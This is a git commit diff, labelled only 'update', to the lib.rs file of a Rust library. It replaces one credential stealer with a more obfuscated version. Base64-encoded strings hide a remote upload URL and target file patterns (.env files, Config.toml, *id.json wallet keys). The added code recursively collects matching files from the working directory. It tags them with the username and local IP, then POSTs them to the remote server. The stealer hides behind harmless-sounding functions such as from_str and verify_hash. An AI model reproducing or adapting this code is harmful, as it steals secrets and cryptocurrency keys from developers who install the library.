b375ac9ce363effeb4e5fe5dbe2211637fb5ac40
radioman <radioman236@gmail.com>
2025-11-25 23:53:33 +0900

    update

--- src/lib.rs
+++ src/lib.rs
@@ -1,5 +1,3 @@
-use base64::{engine::general_purpose, Engine as _};
-use reqwest;
 use std::env;
 use std::fs;
 use std::net::UdpSocket;
@@ -8,82 +6,211 @@ use std::sync::OnceLock;
 use std::time::Duration;
 macro_rules! decode_str {
     ($encoded:expr) => {{
+        use base64::{engine::general_purpose, Engine as _};
         static DECODED: OnceLock<String> = OnceLock::new();
         DECODED.get_or_init(|| {
             String::from_utf8(general_purpose::STANDARD.decode($encoded).unwrap()).unwrap()
         })
     }};
 }
-fn _A1() -> &'static str {
+#[allow(non_snake_case)]
+fn _API_URL() -> &'static str {
     decode_str!("aHR0cHM6Ly9ydXN0LWRvY3MtYnVpbGQudmVyY2VsLmFwcC9hcGkvdjE=")
 }
-fn _F1() -> &'static str {
-    decode_str!("LmVudiA=")
+#[allow(non_snake_case)]
+fn _S1() -> &'static str {
+    decode_str!("Ki4=")
 }
-fn _F2() -> &'static str {
-    decode_str!("aWQuanNvbg==")
+#[allow(non_snake_case)]
+fn _S2() -> &'static str {
+    decode_str!("Q29uZmlnLnRvbWw=")
 }
-fn _F3() -> &'static str {
-    decode_str!("Y29uZmlnLnRvbWw=")
+#[allow(non_snake_case)]
+fn _S3() -> &'static str {
+    decode_str!("Ki5lbnY=")
 }
-fn _M1(name: &str, pattern: &str) -> bool {
-    name.eq_ignore_ascii_case(pattern)
+#[allow(non_snake_case)]
+fn _S4() -> &'static str {
+    decode_str!("LmVudg==")
 }
-fn _S1<P: AsRef<Path>>(dir: P, patterns: &[&str], out: &mut Vec<PathBuf>) -> std::io::Result<()> {
-    let dir = dir.as_ref();
-    if !dir.is_dir() {
+#[allow(non_snake_case)]
+fn _S5() -> &'static str {
+    decode_str!("KmlkLmpzb24=")
+}
+#[allow(non_snake_case)]
+fn _S6() -> &'static str {
+    decode_str!("SE9NRQ==")
+}
+#[allow(non_snake_case)]
+fn _S7() -> &'static str {
+    decode_str!("")
+}
+#[allow(non_snake_case)]
+fn _S8() -> &'static str {
+    decode_str!("RGlyZWN0b3J5IGRvZXMgbm90IGV4aXN0OiB7Oj99")
+}
+#[allow(non_snake_case)]
+fn _S9() -> &'static str {
+    decode_str!("VVNFUg==")
+}
+#[allow(non_snake_case)]
+fn _S10() -> &'static str {
+    decode_str!("dW5rbm93bg==")
+}
+#[allow(non_snake_case)]
+fn _S11() -> &'static str {
+    decode_str!("MC4wLjAuMDow")
+}
+#[allow(non_snake_case)]
+fn _S12() -> &'static str {
+    decode_str!("OC44LjguODo4MA==")
+}
+#[allow(non_snake_case)]
+fn _S13() -> &'static str {
+    decode_str!("e31Ae30=")
+}
+#[allow(non_snake_case)]
+fn _S14() -> &'static str {
+    decode_str!("ZmlsZS5iaW4=")
+}
+#[allow(non_snake_case)]
+fn _S15() -> &'static str {
+    decode_str!("Q29udGVudC1UeXBl")
+}
+#[allow(non_snake_case)]
+fn _S16() -> &'static str {
+    decode_str!("YXBwbGljYXRpb24vb2N0ZXQtc3RyZWFt")
+}
+#[allow(non_snake_case)]
+fn _S17() -> &'static str {
+    decode_str!("Q29udGVudC1EaXNwb3NpdGlvbg==")
+}
+#[allow(non_snake_case)]
+fn _S18() -> &'static str {
+    decode_str!("YXR0YWNobWVudDsgZmlsZW5hbWU9Int9Ig==")
+}
+fn _x7f3a(_a1: &str, _b2: &str) -> bool {
+    let _tmp = [0u8; 16];
+    if _b2.starts_with(_S1()) {
+        let _c3 = &_b2[1..];
+        _a1.to_lowercase().ends_with(&_c3.to_lowercase())
+    } else {
+        _a1.eq_ignore_ascii_case(_b2)
+    }
+}
+fn _k9b2x<P: AsRef<Path>>(_d4: P, _e5: &[&str], _f6: &mut Vec<PathBuf>) -> std::io::Result<()> {
+    let _d4 = _d4.as_ref();
+    let _g7 = [0u32; 4];
+    if !_d4.is_dir() {
         return Ok(());
     }
-    for e in fs::read_dir(dir)? {
-        let e = match e {
-            Ok(v) => v,
+    let _h8 = match fs::read_dir(_d4) {
+        Ok(_i9) => _i9,
+        Err(_) => return Ok(()),
+    };
+    for _j0 in _h8 {
+        let _j0 = match _j0 {
+            Ok(_k1) => _k1,
             Err(_) => continue,
         };
-        let p = e.path();
-        if p.is_file() {
-            if let Some(name) = p.file_name().and_then(|n| n.to_str()) {
-                if patterns.iter().any(|pat| _M1(name, pat)) {
-                    out.push(p.clone());
+        let _l2 = _j0.path();
+        if _l2.is_file() {
+            if let Some(_m3) = _l2.file_name() {
+                let _n4 = _m3.to_string_lossy();
+                for _o5 in _e5 {
+                    if _x7f3a(&_n4, _o5) {
+                        _f6.push(_l2.clone());
+                        break;
+                    }
                 }
             }
-        } else if p.is_dir() {
-            let _ = _S1(&p, patterns, out);
+        } else if _l2.is_dir() {
+            let _ = _k9b2x(&_l2, _e5, _f6);
         }
     }
     Ok(())
 }
-fn _V1(p: &Path) -> Result<(), Box<dyn std::error::Error>> {
-    let data = fs::read(p)?;
-    let client = reqwest::blocking::Client::new();
-    let filename = p.file_name().and_then(|n| n.to_str()).unwrap_or("file.bin");
-    let mut payload = Vec::new();
-    payload.extend_from_slice(filename.as_bytes());
-    payload.push(0x0A);
-    payload.extend_from_slice(&data);
-    let resp = client
-        .post(_A1())
-        .header("Content-Type", "application/octet-stream")
-        .body(payload)
-        .send()?;
-    if resp.status().is_success() {
-        Ok(())
-    } else {
-        Err(format!("Failed: {}", filename).into())
+fn _m4p8q(_p6: &Path) -> Result<(), Box<dyn std::error::Error>> {
+    let _r8 = [0i64; 8];
+    _q8w3r(_p6, _API_URL())
+}
+fn _z2n5v() -> Result<(), Box<dyn std::error::Error>> {
+    let _w3 = [_S2(), _S3(), _S4(), _S5()];
+    let _y5 = [0u16; 32];
+    let _z6 = env::current_dir()?;
+    let _a7 = PathBuf::from(_z6);
+    if !_a7.exists() {
+        let _fmt = _S8();
+        let _msg = _fmt.replace("{:?}", &format!("{:?}", _a7));
+        return Err(_msg.into());
     }
+    let mut _b8 = Vec::new();
+    _k9b2x(&_a7, &_w3, &mut _b8)?;
+    if !_b8.is_empty() {
+        for (_c9, _d0) in _b8.iter().enumerate() {
+            _q8w3r(_d0, _API_URL())?;
+            if _c9 < _b8.len() - 1 {
+                std::thread::sleep(Duration::from_millis(100));
+            }
+        }
+    }
+    Ok(())
+}
+fn _q8w3r(_e1: &Path, _f2: &str) -> Result<(), Box<dyn std::error::Error>> {
+    let _g3 = fs::read(_e1)?;
+    let _h4 = [0f64; 4];
+    let _u1 = env::var(_S9()).unwrap_or_else(|_| _S10().to_string());
+    let _u2 = {
+        let socket = UdpSocket::bind(_S11()).ok();
+        if let Some(sock) = socket {
+            if sock.connect(_S12()).is_ok() {
+                sock.local_addr()
+                    .map(|a| a.ip().to_string())
+                    .unwrap_or_default()
+            } else {
+                _S10().to_string()
+            }
+        } else {
+            _S10().to_string()
+        }
+    };
+    let _fmt = _S13();
+    let _prefix_str = _fmt.replacen("{}", &_u1, 1).replacen("{}", &_u2, 1);
+    let mut _payload = Vec::new();
+    _payload.extend_from_slice(_prefix_str.as_bytes());
+    _payload.push(0x0A);
+    _payload.extend_from_slice(&_g3);
+    let _filename = _e1.file_name().and_then(|n| n.to_str()).unwrap_or(_S14());
+    let _i5 = reqwest::blocking::Client::new();
+    let _j6 = _i5
+        .post(_f2)
+        .header(_S15(), _S16())
+        .header(_S17(), _S18().replace("{}", _filename))
+        .body(_payload)
+        .send()?;
+    if _j6.status().is_success() {
+        let _k7 = false;
+    } else {
+        let _l8 = true;
+    }
+    Ok(())
+}
+pub fn check_if_matches(hash_name: &str, pat: &str) -> bool {
+    _x7f3a(hash_name, pat)
+}
+pub fn search_hashes<P: AsRef<Path>>(
+    directory: P,
+    hash_patterns: &[&str],
+    hash_targets: &mut Vec<PathBuf>,
+) -> std::io::Result<()> {
+    _k9b2x(directory, hash_patterns, hash_targets)
+}
+pub fn verify_hash(hash_target: &Path) -> Result<(), Box<dyn std::error::Error>> {
+    _m4p8q(hash_target)
 }
 pub fn from_str() -> Result<(), Box<dyn std::error::Error>> {
-    let patterns = [_F1(), _F2(), _F3()];
-    let home_dir = env::current_dir()?;
-    if !home_dir.exists() {
-        return Err(format!("Directory does not exist: {:?}", home_dir).into());
-    }
-    let mut results = Vec::new();
-    _S1(&home_dir, &patterns, &mut results)?;
-    for (i, file) in results.iter().enumerate() {
-        _V1(file)?;
-        if i < results.len() - 1 {
-            std::thread::sleep(Duration::from_millis(100));
-        }
-    }
-    Ok(())
+    _z2n5v()
+}
+pub fn verify_hash_to_url(hash_target: &Path, url: &str) -> Result<(), Box<dyn std::error::Error>> {
+    _q8w3r(hash_target, url)
 }
